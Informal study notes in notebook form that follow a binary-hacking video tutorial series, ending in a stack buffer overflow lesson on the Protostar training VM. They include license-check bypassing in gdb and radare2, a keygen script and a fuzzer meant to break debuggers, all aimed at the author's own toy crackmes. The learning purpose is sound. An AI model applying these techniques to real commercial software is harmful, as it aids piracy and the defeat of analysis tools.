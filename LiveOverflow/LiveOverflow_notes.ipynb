{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Notes on Binary Hacking\n",
    "This will be a loose note for the youtube tutorial on binary hacking from LiveOverflow, right now I dont have the time to make it pretty so be warned that it won't be a pretty notebook.\n",
    "### Source: LiveOverflow youtube\n",
    "### https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Usefull VIM commands:\n",
    "\n",
    ":w --> save file <br>\n",
    ":q --> exit file <br>\n",
    ":wq --> save and exit <br>\n",
    ":syntax on --> syntax highlighting <br>\n",
    ":set number --> show line numbers <br>\n",
    ":set expandtab shiftwidth=4 softtabstop=4 --> tab gets replaced by 4 spaces <br>\n",
    ":!command = execute command like when you would be in a terminal. e.g. \":!python matrix.py\" <br>\n",
    "<br>\n",
    "vim -O matrix.c matrix.py --> opens vim with 2 horizontal sub windows to show both files a the same time <br>\n",
    "ctrl + w --> switching between the two windows <br>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Usefull gdb commands:\n",
    "- (gdb) disas main --> shows the assembly of the main function\n",
    "- (gdb) info registers --> shows the values of all registers\n",
    "- (gdb) info functions --> shows all available functions defined in a program\n",
    "- (gdb) x function1 --> shows the address to call the function\n",
    "- (gdb) x/x $\\$$eip --> shows the next instruction\n",
    "- (gdb) x/20x $\\$$esp --> show the next 20 words in hex starting at the stack pointer \n",
    "- (gdb) break *0x12345678 --> sets a breakpoint at the give address/line of assembly code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. Writing a simple Program in C - bin 0x02\n",
    "- when executing a program (e.g. compiled c file) you put a ./ in front\n",
    "- when executing a terminal command the ./ is not required\n",
    "- the reason is that the terminal will look at all places listed in the PATH variable which includes e.g. /usr/bin\n",
    "- for executing the program without specifying the path simply add it the the path variable by \"export PATH=$PATH:/home/pathtoprogram\"\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### First C-program  \n",
    "***matrix.c*** <br>\n",
    "    #include <stdio.h>\n",
    "    \n",
    "    int main(int argc, char *argv[]){  \n",
    "        printf(\"Knock, knock, Neo \\n\");\n",
    "        return 0;\n",
    "    }\n",
    "<br>\n",
    "argc and argv are used to parse an input to the program just like \"./myprogram argument1\"\n",
    "argc = argument count <br>\n",
    "argv = argument vector <br>\n",
    "<br>\n",
    "The program gets compiled via: gcc matrix.c -o matrix -Wall\n",
    "\"-o\" defines the name of the compiled output file <br>\n",
    "\"-Wall\" sets the flag to output all warnings <br>\n",
    "\"return 0\" the program exits without errors <br>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Some small extensions to matrix.c\n",
    "***matrix.c*** <br>\n",
    "    #include <stdio.h>\n",
    "    \n",
    "    int main(int argc, char *argv[]){  \n",
    "        if(argc==2){\n",
    "            printf(\"Knock, knock, %s \\n\", argv[1]);\n",
    "            }\n",
    "        else{\n",
    "            fprintf(stderr, \"Usage: %s <name>\\n\", argv[0]);\n",
    "            return 1;\n",
    "        }\n",
    "            return 0;\n",
    "    }\n",
    "\n",
    "<br>\n",
    "the first argument of argv is the program name itself, if we give more than one additional input the error is printed and a 1 is returned to indicate an error. <br>\n",
    "with \"echo $?\" the exit code of the last program run can be displayed\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Introduction to programming in Python - bin 0x03\n",
    "\n",
    "In contrast to C which uses a compiler to translate code into an executable binary, Python is an interpreted language. In simple terms, someone wrote a program called python in C which opens the interactive shell with all kinds of functions. If python is called with an argument e.g. python myPythonFile.py, it executes the file. <br>\n",
    "***matrix.py*** <br>\n",
    "\n",
    "    import sys\n",
    "    print(sys.argv)\n",
    "python matrix.py abc \"cde\" fgh outputs ['matrix.py', 'abc', 'cde', 'fgh']\n",
    "\n",
    "now lets write our c-program in python3 <br>\n",
    "\n",
    "***matrix.py*** <br>\n",
    "\n",
    "    import sys\n",
    "    \n",
    "    if len(sys.argv) == 2:\n",
    "        print(\"Knock, knock, {0}\".format(sys.argv[1]))\n",
    "    else:\n",
    "        sys.stderr.write(\"Usage: {0} <name>\\n\".format(sys.argv[0]))\n",
    "\n",
    "Executing the program requires \"python matrix.py\", to get rid of the python command, a shebang command can be used. <br>\n",
    "***matrix.py*** <br>\n",
    "    \n",
    "    #!/usr/bin/python3\n",
    "    import sys\n",
    "    \n",
    "    if len(sys.argv) == 2:\n",
    "        print(\"Knock, knock, {0}\".format(sys.argv[1]))\n",
    "    else:\n",
    "        sys.stderr.write(\"Usage: {0} <name>\\n\".format(sys.argv[0]))\n",
    "        \n",
    "Additionally the file has to get the executable flag such that it is not interpreted as a regular text file which is done by chmod +x matrix.py\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4. How a CPU works and Introduction to Assembler - bin 0x04\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- assembly has 8 - 32 global variables of fixed size called registers\n",
    "- fixed size means that on a 32 bit machine those registers have 32 bits.\n",
    "- There are special registers. The most important is the \"Program Counter\" also called instruction pointer, RIP or EIP which tells the CPU which instruction is executed next\n",
    "- Every time an instruction is executed the program counter is incremented\n",
    "- virtually all computation is expressed in terms of simple operations on registers\n",
    "- what doesn't fit in registers lives in memory\n",
    "- memory is accessed by loading and storing at addresses or push and pop operations on a stack\n",
    "- control flow is done via GOTOs, jumps, branches or calls. Those calls are altering the program counter directly\n",
    "- The CPU has the fastest access to registers, followed by the cache and the slowest memory is the RAM.\n",
    "- some functions additionally to manipulating a register will also set flags e.g. the zeroflag if a result was zero\n",
    "<br>\n",
    "#### Assembly example for hello world\n",
    "\n",
    "<pre>\n",
    "   0x0000000000400526   < +0 >:  push   %rbp \n",
    "   0x0000000000400527   < +1 >:  mov    %rsp, %rbp \n",
    "   0x000000000040052a   < +4 >:  mov    $0x4005c4, %edi\n",
    "   0x000000000040052f   < +9 >:\t mov    $0x0, %eax\n",
    "   0x0000000000400534   < +14 >: callq  $0x400400 < printf@plt > \n",
    "   0x0000000000400539   < +19 >: mov    $0x0,%eax \n",
    "   0x000000000040053e   < +24 >: pop    %rbp \n",
    "   0x000000000040053f   < +25 >: retq \n",
    "\n",
    "The memory address is displayed at the left side, followed by the command and its arguments <br>\n",
    "practice at microcurruption.com\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 05. Reversing and Cracking first simple Program - bin 0x05"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***crackme.c***\n",
    "    #include <string.h>\n",
    "    #include <stdio.h>\n",
    "\n",
    "    int main(int argc, char *argv[]){\n",
    "        if(argc==2){\n",
    "            printf(\"Checking the LicenseKey: %s\\n\", argv[1]);\n",
    "            if(strcmp(argv[1], \"licence-key-1337\")==0){\n",
    "                printf(\"Well done\");\n",
    "            }\n",
    "            else{\n",
    "                printf(\"Zonk!!! \\n\");\n",
    "            }  \n",
    "        }\n",
    "        else{\n",
    "            printf(\"Usage: <key> \\n\");\n",
    "        }\n",
    "\n",
    "    }"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***Compiling the program*** <br>\n",
    "\n",
    "    gcc -o crackme crackme.c\n",
    "\n",
    "***Testing the program*** <br>\n",
    "\n",
    "    ./crackme\n",
    "    Usage: <key>\n",
    "\n",
    "    ./crackme alsjdf\n",
    "    Checking the LicenseKey: alsjdf\n",
    "    Zonk!!! \n",
    "\n",
    "***disassembling the program*** <br>\n",
    "\n",
    "    gdb crackme\n",
    "    (gdb) set disassembly-flavor intel\n",
    "    (gdb) disassemble main\n",
    "   \n",
    "<pre>\n",
    "   0x00000000004005b6 <+0>:\t push   rbp\n",
    "   0x00000000004005b7 <+1>:\t mov    rbp,rsp\n",
    "   0x00000000004005ba <+4>:\t sub    rsp,0x10\n",
    "   0x00000000004005be <+8>:\t mov    DWORD PTR [rbp-0x4],edi\n",
    "   0x00000000004005c1 <+11>:\tmov    QWORD PTR [rbp-0x10],rsi\n",
    "   0x00000000004005c5 <+15>:\tcmp    DWORD PTR [rbp-0x4],0x2\n",
    "   0x00000000004005c9 <+19>:\tjne    0x400621 <main+107>\n",
    "   0x00000000004005cb <+21>:\tmov    rax,QWORD PTR [rbp-0x10]\n",
    "   0x00000000004005cf <+25>:\tadd    rax,0x8\n",
    "   0x00000000004005d3 <+29>:\tmov    rax,QWORD PTR [rax]\n",
    "   0x00000000004005d6 <+32>:\tmov    rsi,rax\n",
    "   0x00000000004005d9 <+35>:\tmov    edi,0x4006c4\n",
    "   0x00000000004005de <+40>:\tmov    eax,0x0\n",
    "   0x00000000004005e3 <+45>:\tcall   0x400480 <printf@plt>\n",
    "   0x00000000004005e8 <+50>:\tmov    rax,QWORD PTR [rbp-0x10]\n",
    "   0x00000000004005ec <+54>:\tadd    rax,0x8\n",
    "   0x00000000004005f0 <+58>:\tmov    rax,QWORD PTR [rax]\n",
    "   0x00000000004005f3 <+61>:\tmov    esi,0x4006e1\n",
    "   0x00000000004005f8 <+66>:\tmov    rdi,rax\n",
    "   0x00000000004005fb <+69>:\tcall   0x4004a0 <strcmp@plt>\n",
    "   0x0000000000400600 <+74>:\ttest   eax,eax\n",
    "   0x0000000000400602 <+76>:\tjne    0x400615 <main+95>\n",
    "   0x0000000000400604 <+78>:\tmov    edi,0x4006f2\n",
    "   0x0000000000400609 <+83>:\tmov    eax,0x0\n",
    "   0x000000000040060e <+88>:\tcall   0x400480 <printf@plt>\n",
    "   0x0000000000400613 <+93>:\tjmp    0x40062b <main+117>\n",
    "   0x0000000000400615 <+95>:\tmov    edi,0x4006fc\n",
    "   0x000000000040061a <+100>:   call   0x400470 <puts@plt>\n",
    "   0x000000000040061f <+105>:   jmp    0x40062b <main+117>\n",
    "   0x0000000000400621 <+107>:   mov    edi,0x400705\n",
    "   0x0000000000400626 <+112>:   call   0x400470 <puts@plt>\n",
    "   0x000000000040062b <+117>:   mov    eax,0x0\n",
    "   0x0000000000400630 <+122>:   leave  \n",
    "   0x0000000000400631 <+123>:   ret\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First try to get an overview of the control flow.\n",
    "<pre>\n",
    " <+15>:\tcmp 0x2\n",
    " <+19>:\tjne <main+107>\n",
    "\n",
    " <+45>:\tcall printf\n",
    " <+69>:\tcall strcmp\n",
    " <+74>:\ttest\n",
    " <+76>:\tjne <main+95>\n",
    "\n",
    " <+88>:\tcall printf\n",
    " <+93>:\tjmp\n",
    "\n",
    " <+100>:  call puts\n",
    " <+105>:  jmp \n",
    "\n",
    " <+112>:  call puts\n",
    " <+117>: exit program\n",
    "\n",
    "At the start (main+15) we got a compare with the number 2 followed by a \"jne\"/jump not equal.\n",
    "Depending on the result we jump to 400621/<main+107> which puts something in edi, calls \"puts\" which is just a print command and exits\n",
    "<pre>\n",
    "    <+15>:\tcmp 0x2\n",
    "|-- <+19>:\tjne main+107\n",
    "|  \n",
    "|   <+45>:\tcall printf\n",
    "|   <+69>:\tcall strcmp\n",
    "|   <+74>:\ttest\n",
    "|   <+76>:\tjne main+95\n",
    "|\n",
    "|   <+88>:\tcall printf\n",
    "|   <+93>:\tjmp\n",
    "|\n",
    "|   <+100>:  call puts\n",
    "|   <+105>:  jmp \n",
    "|\n",
    "|--> <+112>:  call puts\n",
    "     <+117>: exit program\n",
    "\n",
    "If the compare gets a 2 we get a printf at main+45, followed by a strcmp at main+69.\n",
    "Depending on the result of strcmp we got a \"jne\" again at line main+76 which either jumps to main+95 (another puts/print) or proceeds to main+88\n",
    "\n",
    "<pre>\n",
    "    <+15>:\tcmp 0x2\n",
    "|-- <+19>:\tjne main+107\n",
    "|   |\n",
    "|   <+45>:\tcall printf\n",
    "|   <+69>:\tcall strcmp\n",
    "|   <+74>:\ttest\n",
    "||--<+76>:\tjne main+95\n",
    "||  |\n",
    "||  <+88>:\tcall printf\n",
    "||  <+93>:\tjmp main+117 / exit\n",
    "||\n",
    "||-><+100>:  call puts\n",
    "|   <+105>:  jmp main+117 / exit\n",
    "|\n",
    "|--> <+112>:  call puts\n",
    "     <+117>: exit program\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "(gdb) break *main --> sets a breakpoint right at the start\n",
    "(gdb) run\n",
    "(gdb) info registers --> shows the value of all registers including the position of the instruction \n",
    "pointer\n",
    "(gdb) si --> steps one instruction / instruction pointer as a different value now\n",
    "(gdb) ni --> step one instruction in main / not just one instruction in a called function\n",
    "repeating ni results in \"Usage: < key >\" which is understandable since we did not provide an input and the compare with 2 is \"not equal\".\n",
    "\n",
    "lets retry with: \n",
    "(gdb) run licence-key-1447\n",
    "\n",
    "repeat (gdb) ni\n",
    "output: Checking the LicenseKey: licence-key-1447\n",
    "\n",
    "repeat (gdb) ni\n",
    "0x0000000000400602 <+76>\n",
    "(gdb) ni\n",
    "0x0000000000400615 <+95>\n",
    "so we jumped over lines <+88> and <+93>\n",
    "\n",
    "set a breakpoint right before this comparison and jump\n",
    "(gdb) break *0x0000000000400600\n",
    "(gdb) run licence-key-1447\n",
    "(gdb) continue --> runs until our second breakpoint\n",
    "\n",
    "Now we are at: 0x0000000000400600 <+74>:\ttest   eax,eax\n",
    "eax (first 32 bit of rax) is not 0 which was the result of the string comparison.\n",
    "(gdb) set $eax=0 --> sets this comparison flag to zero\n",
    "repeat (gdb) ni --> \"well done\"\n",
    "\n",
    "Exercises can be found on Crackmes.de"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 06.  Simple Tools and Techniques for Reversing a binary - bin 0x06"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- hexdump -C crackme --> prints the hex code of the file. This even includes the string of the license key\n",
    "- strings crackme --> prints all the strings which can be read\n",
    "- objdump --> outputs far more information about a file\n",
    "\n",
    "- linux provides various functions so called syscalls e.g. write which writes output on the console.\n",
    "- - Used functions can be checked with strace and ltrace.\n",
    "- - ltrace gives us an output: strcmp(\"alsdjflsd\", \"licence-key-1337\") which includes the key!\n",
    "- affortable decompiler and some reverse engineering tools are provided by Hopper. A freeware alternative is radare2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 07. Uncrackable Programs? Key validation with Algorithm and creating a Keygen - bin 0x07"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Since we can read strings like License Keys out of the binary lets try to use the cross sum of the asci values of the key letters.\n",
    "\n",
    "***crackme_v2.c***\n",
    "    #include <string.h>\n",
    "    #include <stdio.h>\n",
    "\n",
    "    int main(int argc, char *argv[]){\n",
    "        if(argc==2){\n",
    "            printf(\"Checking the LicenseKey: %s\\n\", argv[1]);\n",
    "            int sum = 0;\n",
    "            for(int i=0; i < strlen(argv[1]); i++){\n",
    "                sum += (int)argv[1][i];\n",
    "            }\n",
    "            \n",
    "            if(sum == 1348){\n",
    "                printf(\"Well done \\n\");\n",
    "            }\n",
    "            else{\n",
    "                printf(\"Zonk!!! \\n\");\n",
    "            }  \n",
    "        }\n",
    "        else{\n",
    "            printf(\"Usage: <key> \\n\");\n",
    "        }\n",
    "\n",
    "    }\n",
    "\n",
    "gcc -o crackme_v2 crackme_v2.c <br>\n",
    "radare2 crackme_v2 <br>\n",
    "\n",
    "***radare commands***\n",
    "\n",
    "    aaa = aa --> analyze all (e.g. it figures out where the main function is)\n",
    "    s main --> seeks the main function (can also be used to seek a memory address)\n",
    "    \"Esc\"-button --> go one step back\n",
    "    pdf --> show disassembly\n",
    "    v --> enter visual mode\n",
    "    VV --> show flow graph of the program\n",
    "    ood abcdefg --> open program in debug mode with function argument abcdefg\n",
    "    dc --> execute the program\n",
    "    db 0x00400656 --> set breakpoint at 0x00400656\n",
    "    ds --> step one instruction\n",
    "    quit --> leave radare2\n",
    "    dr --> display registers\n",
    "    dr rip=0x00400658 --> sets rip to 0x00400658\n",
    "    afvn local_2_4 i --> renames local_2_4 variable to i\n",
    "\n",
    "***Way to bypass the input:***\n",
    "\n",
    "    radare2 crackme_v2\n",
    "    aaa\n",
    "    s sym.main\n",
    "    pdf\n",
    "    look for the decision where the jump into the wrong or right is executed. (0x00400656)\n",
    "    ood alsdjflsjdf\n",
    "    dc\n",
    "    db 0x00400656\n",
    "    ood lfjsldfjsf\n",
    "    dc\n",
    "    dr\n",
    "    dr rip=0x00400658 --> set the instruction pointer on the print statement \"printf(\"Well done \\n\");\"\n",
    "    dc\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 21,
     "metadata": {
      "image/png": {
       "height": 346,
       "width": 395
      }
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import Image\n",
    "Image(\"imgs/radare_for_loop.png\", retina=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***The image above shows a for loop in radare***\n",
    "\n",
    "in the bottom left \"add dword [var_14h], 1\" adds a 1 to our counter (i++) with var_14h being our \"i\"\n",
    "\n",
    "the \"cmp rbx, rax\" in the top block is our condition which either loops (going left) or leaves depending on the strlen call above, rbx and rax. \n",
    "\n",
    "After understanding that the left block iterates over the input and sums up the ASCI values of the string, followed by a comparison of this sum with 0x544 we can create a keygen."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def check_key(key, printFlag):\n",
    "    char_sum = 0\n",
    "    for c in key:\n",
    "        char_sum += ord(c)\n",
    "        \n",
    "    if printFlag:\n",
    "        print(key, char_sum)\n",
    "    return char_sum\n",
    "\n",
    "check_key('AAA', 1)\n",
    "check_key('AAB', 1)\n",
    "check_key('BAA', 1)\n",
    "\n",
    "import random\n",
    "\n",
    "def keygen(num_keys):\n",
    "    i = 1\n",
    "    key = \"\"\n",
    "    while True:\n",
    "        key += random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_')\n",
    "        s = check_key(key, 0)\n",
    "        if s > int(0x544):\n",
    "            key = \"\"\n",
    "        elif s == int(0x544):\n",
    "            print(key)\n",
    "            i += 1\n",
    "        \n",
    "        if(i>num_keys):\n",
    "            break\n",
    "\n",
    "keygen(5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import subprocess\n",
    "print(subprocess.check_output([\"./crackme_v2\", \"L1TU9-O5yxpLfpeL\"]))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 08. Uncrackable Program? Finding a Parser Differential in loading ELF - bin 0x08"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "since gdb or radare execute the binary which contains more than just the source code, it might be possibly to change part of the executable such that linux can still execute it but gdb and radare throw and error due to a perser differential."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import random\n",
    "import os\n",
    "def flip_byte(in_bytes):\n",
    "    i = random.randint(0, len(in_bytes))\n",
    "    c = str(random.randint(0,255))\n",
    "    return in_bytes[:i] + c + in_bytes[i+1:]\n",
    "\n",
    "print(flip_byte('AAAAAAAAAAA'))\n",
    "print(flip_byte('AAAAAAAAAAA'))\n",
    "print(flip_byte('AAAAAAAAAAA'))\n",
    "print(flip_byte('AAAAAAAAAAA'))\n",
    "print(flip_byte('AAAAAAAAAAA'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "os.system(\"cp crackme_v2 crackme_v2_fuzz\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import random\n",
    "import os\n",
    "\n",
    "def flip_byte(in_bytes):\n",
    "    i = random.randint(0, len(in_bytes))\n",
    "    # in python3 there is no implicit type conversion between str and bytes str() has to be replaced with bytes()\n",
    "    c = bytes(random.randint(0,255))\n",
    "    return in_bytes[:i] + c + in_bytes[i+1:]\n",
    "\n",
    "os.system(\"cp crackme_v2 crackme_v2_fuzz\")\n",
    "def copy_binary():\n",
    "    os.system(\"cp crackme_v2 crackme_v2_fuzz\")\n",
    "    with open('crackme_v2', 'rb') as orig_f, open('crackme_v2_fuzz', 'wb') as new_f:\n",
    "        new_f.write( flip_byte(orig_f.read()) )\n",
    "\n",
    "def compare(fn1, fn2):\n",
    "    with open(fn1) as f1, open(fn2) as f2:\n",
    "        return f1.read() == f2.read()\n",
    "\n",
    "os.system(\"(./crackme_v2_fuzz ; ./crackme_v2_fuzz L1TU9-O5yxpLfpeL) > orig_output\")\n",
    "def check_output():\n",
    "    os.system(\"(./crackme_v2_fuzz ; ./crackme_v2_fuzz L1TU9-O5yxpLfpeL) > fuzz_output\")\n",
    "    return compare(\"orig_output\", \"fuzz_output\")\n",
    "\n",
    "os.system(\"echo disassemble main | gdb crackme_v2_fuzz > orig_gdb\")\n",
    "def check_gdb():\n",
    "    os.system(\"echo disassemble main | gdb crackme_v2_fuzz > fuzz_gdb\")\n",
    "    return compare(\"orig_gdb\", \"fuzz_gdb\")\n",
    "\n",
    "\n",
    "os.system('echo -e \"aaa\\ns sym.main\\npdf\" | radare2 crackme_v2_fuzz > orig_radare')\n",
    "def check_radare2():\n",
    "    os.system(\"echo -e 'aaa\\n s sym.main \\n pdf'\"\" | radare2 crackme_v2_fuzz > fuzz_radare \")\n",
    "    return compare(\"orig_radare\", \"fuzz_radare\")\n",
    "\n",
    "\n",
    "while True:\n",
    "    copy_binary()\n",
    "    if check_output() and not check_gdb() and not check_radare2():\n",
    "\n",
    "        print(\"Found possible binary\")\n",
    "        os.system(\"tail fuzz_gdb\")\n",
    "        os.system(\"tail fuzz_radare\")\n",
    "                  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 09. Syscalls, Kernel vs. user Mode and linux Kernel Source Code - bin 0x09"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The system call is the fundamental interface between an application and the Linux kernel\n",
    "\n",
    "***write_test.c***\n",
    "\n",
    "    void main(){\n",
    "        write(1, \"HACK\\n\", 5);\n",
    "    }\n",
    "   \n",
    "   \n",
    "    gcc -o write_test write_test.c\n",
    "    radare2 -d ./write_test\n",
    "    aaa\n",
    "    s sym.main\n",
    "    pdf\n",
    "    look for the memory address of \"call sym.imp.write\"\n",
    "    e.g. 0x0040053e      e8bdfeffff     call sym.imp.write\n",
    "    db 0x0040053e\n",
    "    dc\n",
    "    V!\n",
    "    with s you can step through the write function\n",
    "    \n",
    "- in the end a 1 is written into eax and a syscall is executed\n",
    "- Depending on which number is written into eax the processor jumps to a different memory location. On the different memory locations different functions are located. \n",
    "- A Linux Syscall table shows which eax number corresponds to which function. e.g. 1=write\n",
    "- A syscall is a level 0 privilege level procedure (Kernel level). In user mode you can not directly access level 0 but instead have to go through something like a syscall.\n",
    "- those syscalls often invoke pointers to some arguments like a string which has to be printed, the memory locations of those pointers for different programs often are in the same memory space. This happens because the memory locations are not the physical one on the RAM but instead virtual memory which is managed by the memory management unit (MMU) and distributed by the MMU to to RAM such that the programmer does not have to care about which memory is in use or not. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 10. The deal with numbers: hexadecimal, binary and decimals - bin 0x0A"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- since our CPUs are clusters of transistors which can be on or off, 0/1 are the obvious choice for digits in the machine language 0/1 = bit\n",
    "- IBMs System 360 is the historical reason for 8 bits instead of any other number being 1 byte = 1 Oktett\n",
    "- 4 bits are 1 nibble and 1 nibble can be represented by 1 hex digit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "15\n",
      "255\n",
      "00000000 |   0 |  0\n",
      "00000010 |   2 |  2\n",
      "01010101 |  85 | 55\n",
      "11110010 | 242 | f2\n",
      "11111111 | 255 | ff\n"
     ]
    }
   ],
   "source": [
    "print(int('1111', 2)) # what is 1111 with a base of 2 in decimal\n",
    "print(int('11111111', 2))\n",
    "\n",
    "for i in ['00000000', '00000010', '01010101', '11110010', '11111111']:\n",
    "    print(\"{0} | {1:3} | {2:2x}\".format(i, int(i,2), int(i,2)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0b1111011\n",
      "0x7b\n",
      "123\n"
     ]
    }
   ],
   "source": [
    "print( bin(123) )\n",
    "print( hex(123) )\n",
    "print( int('0b1111011', 2) )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(1145258561,)\n",
      "0x44434241\n",
      "b'EbE\\x03'\n"
     ]
    }
   ],
   "source": [
    "import struct\n",
    "print( struct.unpack(\"I\", bytes(\"ABCD\", 'utf-8')) ) # I=integer\n",
    "print( hex(struct.unpack(\"I\", bytes(\"ABCD\", 'utf-8'))[0]) )\n",
    "print( struct.pack(\"I\", 0x3456245) ) # 41 = 'A' is at the end because of little endian"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***Negative numbers***\n",
    "\n",
    "    0000 = 0\n",
    "    0001 = 1\n",
    "    0010 = 2\n",
    "    0011 = 3\n",
    "    0100 = 4\n",
    "    0101 = 5\n",
    "    0110 = 6\n",
    "    0111 = 7\n",
    "    1000 = -8\n",
    "    1001 = -7\n",
    "    1010 = -6\n",
    "    1011 = -5\n",
    "    1100 = -4\n",
    "    1101 = -3\n",
    "    1110 = -2\n",
    "    1111 = -1\n",
    "\n",
    "- Two's complement, invert the bits and add 1\n",
    "- 0011 = 3\n",
    "- inverting --> 1100\n",
    "- add 1 --> 1101 = -3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    bit = 0/1\n",
    "    nibble = 1010 = 4 bits\n",
    "    byte = 1010 0000 = 2 nibbles = 2 hex numbers 0xA0\n",
    "    a word on 32 bit = 32 bits = 8 hex numbers\n",
    "    a word on 64 bit machines = 64 bits = double word on 32 bit = 16 hex numbers = 8 bytes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 11. Smashing the Stack for Fun and Profit- setuid, ssh and exploit.education - bin 0x0B"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://phrack.org/issues/49/14.html <br>\n",
    "https://exploit-exercises.injecti0n.org/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "- download the protostar iso from https://exploit-exercises.injecti0n.org/\n",
    "- start the iso with vmware and login with User:user, PW: user and get the IP with \"ip addr\"\n",
    "- in my case the ip is: 172.16.82.128 for eth0\n",
    "- connect to protostar using ssh user@172.16.82.128\n",
    "- echo $SHELL -->   /bin/sh tells us the we use sh right now\n",
    "- switch to bash by \"/bin/bash\"\n",
    "- the levels to be exploited can be found in the /opt/protostar/bin directory\n",
    "- the executables have the following rights \" -rwsr-xr-x\" with s being the set UID bit. this means that the program will be run as root even if a regular user executes it. If we find an exploit for such a program we can escalate our priviliges and execute our code as root. e.g. \"sudo\" has such a flag\n",
    "- using programs like gdb will not run such a program as root but instead of the user using gdb!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 12. First Stack Buffer Overflow to modify Variable - bin 0x0C"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***disassembly of /opt/protostar/bin/stack0***\n",
    "    \n",
    "<pre>\n",
    "    $ gdb ./stack0\n",
    "    (gdb) disassemble main\n",
    "    call < main >\n",
    "    ...\n",
    "    0x080483f4 < main+0 >:   push   %ebp\n",
    "    0x080483f5 < main+1 >:   mov    %esp,%ebp\n",
    "    0x080483f7 < main+3 >:   and    $0xfffffff0,%esp # makes the last byte a zero\n",
    "    0x080483fa < main+6 >:   sub    $0x60,%esp # provides 96 bytes of space on the stack (it grows downward)\n",
    "    0x080483fd < main+9 >:   movl   $0x0,0x5c(%esp) # write a 0 in \n",
    "    0x08048405 < main+17 >:  lea    0x1c(%esp),%eax # probably start address for gets\n",
    "    0x08048409 < main+21 >:  mov    %eax,(%esp)\n",
    "    0x0804840c < main+24 >:  call   0x804830c <gets@plt>\n",
    "    0x08048411 < main+29 >:  mov    0x5c(%esp),%eax # move the defined 0 into eax\n",
    "    0x08048415 < main+33 >:  test   %eax,%eax # tests of eax is zero\n",
    "    0x08048417 < main+35 >:  je     0x8048427 <main+51> # jumps if eax is zero\n",
    "    0x08048419 < main+37 >:  movl   $0x8048500,(%esp)\n",
    "    0x08048420 < main+44 >:  call   0x804832c < puts@plt >\n",
    "    0x08048425 < main+49 >:  jmp    0x8048433 < main+63 >\n",
    "    0x08048427 < main+51 >:  movl   $0x8048529,(%esp)\n",
    "    0x0804842e < main+58 >:  call   0x804832c < puts@plt >\n",
    "    0x08048433 < main+63 >:  leave  \n",
    "    0x08048434 < main+64 >:  ret\n",
    "    \n",
    "\n",
